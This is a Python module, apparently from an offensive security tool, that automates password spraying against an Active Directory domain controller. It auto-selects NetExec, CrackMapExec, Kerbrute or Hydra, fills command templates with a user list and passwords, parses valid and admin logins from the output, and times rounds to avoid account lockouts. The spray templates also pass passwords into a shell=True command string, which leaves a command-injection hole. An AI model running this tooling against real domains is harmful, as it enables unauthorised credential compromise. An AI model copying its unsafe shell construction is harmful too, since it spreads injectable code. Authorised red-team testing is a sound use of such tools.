"""
Spray Executor for Auto Password Spray

Executes spray tools via subprocess with real-time output streaming.
Supports multiple tools with automatic detection and fallback.

Features:
- Real-time stdout/stderr streaming
- Automatic tool detection
- Result parsing for successful credentials
- Temporary file management
- Lockout-aware execution with delays
"""

from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import List, Optional, Callable, Iterator, Tuple
import subprocess
import shutil
import tempfile
import os
import sys

from .result_parser import ResultParser, ParsedResult, SprayTool
from .lockout_manager import LockoutManager, SprayWindow


class ToolNotFoundError(Exception):
    """Raised when no spray tool is available."""
    pass


@dataclass
class ToolConfig:
    """
    Configuration for a spray tool.

    Attributes:
        name: Human-readable tool name
        binary: Binary name (for shutil.which)
        check_cmd: Command to verify tool exists
        spray_template: Command template with placeholders
        success_pattern: Regex for successful auth
        admin_pattern: Regex for admin access (optional)
        protocol: Network protocol used
    """
    name: str
    binary: str
    check_cmd: List[str]
    spray_template: str
    success_pattern: str
    admin_pattern: Optional[str] = None
    protocol: str = "smb"


# Built-in tool configurations
TOOL_CONFIGS = {
    SprayTool.NETEXEC: ToolConfig(
        name="NetExec",
        binary="netexec",
        check_cmd=["netexec", "--version"],
        spray_template="netexec smb {dc_ip} -u {user_file} -p '{password}' -d {domain} --continue-on-success",
        success_pattern=r"\[\+\].*\\(\w+):",
        admin_pattern=r"\(Pwn3d!\)",
        protocol="smb",
    ),
    SprayTool.CRACKMAPEXEC: ToolConfig(
        name="CrackMapExec",
        binary="crackmapexec",
        check_cmd=["crackmapexec", "--version"],
        spray_template="crackmapexec smb {dc_ip} -u {user_file} -p '{password}' -d {domain} --continue-on-success",
        success_pattern=r"\[\+\].*\\(\w+):",
        admin_pattern=r"\(Pwn3d!\)",
        protocol="smb",
    ),
    SprayTool.KERBRUTE: ToolConfig(
        name="Kerbrute",
        binary="kerbrute",
        check_cmd=["kerbrute", "--help"],
        spray_template="kerbrute passwordspray -d {domain} --dc {dc_ip} {user_file} '{password}'",
        success_pattern=r"VALID LOGIN.*?(\w+)@",
        admin_pattern=None,
        protocol="kerberos",
    ),
    SprayTool.HYDRA: ToolConfig(
        name="Hydra",
        binary="hydra",
        check_cmd=["hydra", "-h"],
        spray_template="hydra -L {user_file} -p '{password}' smb://{dc_ip}",
        success_pattern=r"login:\s*(\w+)\s+password:",
        admin_pattern=None,
        protocol="smb",
    ),
}

# Tool priority for auto-detection (NetExec preferred as it's newer)
TOOL_PRIORITY = [
    SprayTool.NETEXEC,
    SprayTool.CRACKMAPEXEC,
    SprayTool.KERBRUTE,
    SprayTool.HYDRA,
]


@dataclass
class SprayResult:
    """
    Result from a spray attempt.

    Attributes:
        success: Whether any valid credentials were found
        results: List of successful authentications
        password: Password that was tested
        target: Target that was sprayed
        tool: Tool used for spray
        duration_seconds: How long the spray took
        error: Error message if spray failed
    """
    success: bool
    results: List[ParsedResult] = field(default_factory=list)
    password: str = ""
    target: str = ""
    tool: str = ""
    duration_seconds: float = 0.0
    error: Optional[str] = None

    @property
    def admin_count(self) -> int:
        """Number of results with admin access."""
        return sum(1 for r in self.results if r.is_admin)

    @property
    def credential_count(self) -> int:
        """Total number of valid credentials found."""
        return len(self.results)


class SprayExecutor:
    """
    Executes spray tools with real-time output streaming.

    Features:
    - Automatic tool detection and fallback
    - Real-time stdout/stderr streaming
    - Result parsing with success/admin detection
    - Temporary file management for user lists
    """

    def __init__(
        self,
        tool: Optional[SprayTool] = None,
        domain: str = "",
        dc_ip: str = "",
        timeout: int = 300,
        verbose: bool = True,
    ):
        """
        Initialize spray executor.

        Args:
            tool: Specific tool to use (auto-detect if None)
            domain: Target domain
            dc_ip: Domain controller IP
            timeout: Command timeout in seconds
            verbose: Print output in real-time
        """
        self.tool = tool
        self.domain = domain
        self.dc_ip = dc_ip
        self.timeout = timeout
        self.verbose = verbose
        self._temp_files: List[Path] = []
        self._detected_tool: Optional[SprayTool] = None

    def detect_available_tool(self) -> Optional[SprayTool]:
        """
        Find first available tool in priority order.

        Returns:
            SprayTool enum or None if no tools available
        """
        if self._detected_tool:
            return self._detected_tool

        for tool in TOOL_PRIORITY:
            if self.is_tool_available(tool):
                self._detected_tool = tool
                return tool

        return None

    def is_tool_available(self, tool: SprayTool) -> bool:
        """
        Check if a tool is installed and accessible.

        Args:
            tool: Tool to check

        Returns:
            True if tool is available
        """
        config = TOOL_CONFIGS.get(tool)
        if not config:
            return False

        return shutil.which(config.binary) is not None

    def get_tool(self) -> SprayTool:
        """
        Get the tool to use for spraying.

        Returns:
            SprayTool to use

        Raises:
            ToolNotFoundError if no tool available
        """
        if self.tool:
            if not self.is_tool_available(self.tool):
                raise ToolNotFoundError(f"Tool {self.tool.value} not found")
            return self.tool

        detected = self.detect_available_tool()
        if not detected:
            raise ToolNotFoundError(
                "No spray tools found. Install one of: netexec, crackmapexec, kerbrute, hydra"
            )
        return detected

    def get_tool_config(self) -> ToolConfig:
        """Get configuration for the selected tool."""
        tool = self.get_tool()
        return TOOL_CONFIGS[tool]

    def create_user_file(self, users: List[str]) -> Path:
        """
        Create temporary file with usernames.

        Args:
            users: List of usernames

        Returns:
            Path to temporary file
        """
        fd, path = tempfile.mkstemp(suffix='.txt', prefix='spray_users_')
        temp_path = Path(path)

        with os.fdopen(fd, 'w') as f:
            f.write('\n'.join(users))

        self._temp_files.append(temp_path)
        return temp_path

    def _build_command(self, user_file: Path, password: str) -> str:
        """Build spray command from template."""
        config = self.get_tool_config()

        return config.spray_template.format(
            dc_ip=self.dc_ip,
            domain=self.domain,
            user_file=str(user_file),
            password=password,
        )

    def spray_single_password(
        self,
        users: List[str],
        password: str,
        output_callback: Optional[Callable[[str], None]] = None,
    ) -> SprayResult:
        """
        Spray single password against user list.

        Args:
            users: List of usernames to spray
            password: Password to test
            output_callback: Called with each line of output in real-time

        Returns:
            SprayResult with findings
        """
        import time
        start_time = time.time()

        tool = self.get_tool()
        user_file = self.create_user_file(users)
        cmd = self._build_command(user_file, password)

        output_lines: List[str] = []
        results: List[ParsedResult] = []
        error: Optional[str] = None

        try:
            # Run with real-time output streaming
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                stdin=subprocess.DEVNULL,  # Prevent stdin inheritance
                text=True,
                bufsize=1,  # Line buffered
            )

            # Stream output line by line
            for line in iter(process.stdout.readline, ''):
                line = line.rstrip()
                output_lines.append(line)

                # Callback for real-time display
                if output_callback:
                    output_callback(line)
                elif self.verbose:
                    print(line)

                # Parse for results
                parsed = ResultParser.parse_line(line, tool, password, self.dc_ip)
                if parsed:
                    results.append(parsed)

            process.wait(timeout=self.timeout)

            if process.returncode != 0 and not results:
                error = f"Command exited with code {process.returncode}"

        except subprocess.TimeoutExpired:
            process.kill()
            error = f"Command timed out after {self.timeout} seconds"
        except Exception as e:
            error = str(e)

        duration = time.time() - start_time

        return SprayResult(
            success=len(results) > 0,
            results=results,
            password=password,
            target=self.dc_ip,
            tool=tool.value,
            duration_seconds=duration,
            error=error,
        )

    def spray_with_plan(
        self,
        users: List[str],
        passwords: List[str],
        lockout_manager: LockoutManager,
        progress_callback: Optional[Callable[[int, int, str], None]] = None,
        result_callback: Optional[Callable[[SprayResult], None]] = None,
    ) -> List[SprayResult]:
        """
        Execute full spray plan with lockout protection.

        Args:
            users: List of usernames
            passwords: List of passwords to spray
            lockout_manager: Handles timing/delays
            progress_callback: Called with (current, total, status)
            result_callback: Called after each password spray

        Returns:
            List of all SprayResults
        """
        all_results: List[SprayResult] = []
        plan = lockout_manager.get_spray_plan(passwords)
        total_passwords = len(passwords)
        current = 0

        for window in plan:
            if progress_callback:
                progress_callback(
                    current, total_passwords,
                    f"Round {window.round_number}/{len(plan)}"
                )

            # Spray each password in this window
            for password in window.passwords:
                current += 1

                if progress_callback:
                    progress_callback(
                        current, total_passwords,
                        f"Testing: {password[:20]}..."
                    )

                result = self.spray_single_password(users, password)
                all_results.append(result)

                if result_callback:
                    result_callback(result)

                # If we found valid creds, report immediately
                if result.success and self.verbose:
                    for r in result.results:
                        admin = " (ADMIN)" if r.is_admin else ""
                        print(f"[+] VALID: {r.username}:{r.password}{admin}")

            # Mark round complete and wait if not last round
            lockout_manager.record_spray_round()

            if window.delay_seconds > 0:
                if progress_callback:
                    progress_callback(
                        current, total_passwords,
                        f"Waiting {window.delay_seconds // 60} min..."
                    )

                def wait_callback(remaining: int, total: int):
                    if progress_callback:
                        mins = remaining // 60
                        secs = remaining % 60
                        progress_callback(
                            current, total_passwords,
                            f"Wait: {mins:02d}:{secs:02d}"
                        )

                lockout_manager.wait_for_window(wait_callback)

        return all_results

    def cleanup(self) -> None:
        """Remove temporary files."""
        for path in self._temp_files:
            try:
                if path.exists():
                    path.unlink()
            except Exception:
                pass
        self._temp_files.clear()

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.cleanup()
        return False

    @classmethod
    def get_available_tools(cls) -> List[Tuple[SprayTool, str]]:
        """
        Get list of available tools with their versions.

        Returns:
            List of (SprayTool, version_string) tuples
        """
        available = []

        for tool in TOOL_PRIORITY:
            config = TOOL_CONFIGS.get(tool)
            if not config:
                continue

            if shutil.which(config.binary):
                # Try to get version
                version = "installed"
                try:
                    result = subprocess.run(
                        config.check_cmd,
                        capture_output=True,
                        text=True,
                        timeout=5
                    )
                    # Extract version from first line
                    if result.stdout:
                        first_line = result.stdout.strip().split('\n')[0]
                        version = first_line[:50]
                except Exception:
                    pass

                available.append((tool, version))

        return available
